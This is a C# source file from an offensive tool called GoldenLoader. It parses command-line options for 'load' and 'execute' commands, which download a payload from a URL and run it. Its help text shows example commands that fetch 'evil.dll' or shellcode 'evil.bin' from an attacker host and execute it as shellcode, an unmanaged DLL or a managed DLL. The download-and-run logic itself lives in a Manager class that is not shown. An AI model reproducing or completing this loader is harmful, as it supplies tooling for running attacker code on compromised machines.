using System;
using System.Linq;

namespace GoldenLoader
{
    public class Utils
    {
        public static bool parseArguments(string[] args)
        {
            getValues(args, out var url, out var arguments, out var type, out var method);

            Manager m = new Manager();

            switch (args[0])
            {
                case "load":
                    if (url == "") 
                        Console.WriteLine("Unknown url.");
                    else
                        m.createProcess(url, type, arguments, method);
                    
                    break;
                case "execute":
                    if (url == "") 
                        Console.WriteLine("Unknown url.");
                    else
                    {
                        m.downloadAndExecute(url, type, arguments, method);
                    }
                    break;
                case "-h":
                    printHelp();
                    break;
                default:
                    Console.WriteLine("Unknown command.");
                    break;
            }
            return true;
        }

        public static void getValues(string[] args, out string url, out string arguments, out string type, out string method)
        {
            url = "";
            arguments = "";
            type = "";
            method = "";
            var skip = args.Skip(1).ToArray();

            for (int i = 0; i < skip.Length - 1; i += 2)
            {
                switch (skip[i])
                {
                    case "-u":
                        url = skip[i + 1];
                        break;
                    case "-p":
                        arguments = skip[i + 1];
                        break;
                    case "-t":
                        type = skip[i + 1];
                        break;
                    case "-m":
                        method = skip[i + 1];
                        break;
                    default:
                        Console.WriteLine("Unknown option " + skip[i]);
                        break;
                }
            }
        }

        public static void printHelp()
        {
            var help = @"
usage:  GoldenLoader.exe load -u <url> -t <type> [options]
        GoldenLoader.exe load -u https://attackerIPaddress/evil.dll -t managed -m someFunction -p 'arg1 arg2...'
        GoldenLoader.exe load -u https://attackerIPaddress/evil.bin -t shellcode
        GoldenLoader.exe load -u https://attackerIPaddress/evil.dll -t unmanaged  

  options:
    -u  Payload URL. 
    -t  Payload type (shellcode, unmanaged or managed).  
    -m  Function from the loaded dll to execute. Available only with <managed> type.  
    -p  Arguments passed to the function. Available only with <managed> type.

";
            Console.WriteLine(help);
        }
    }
}
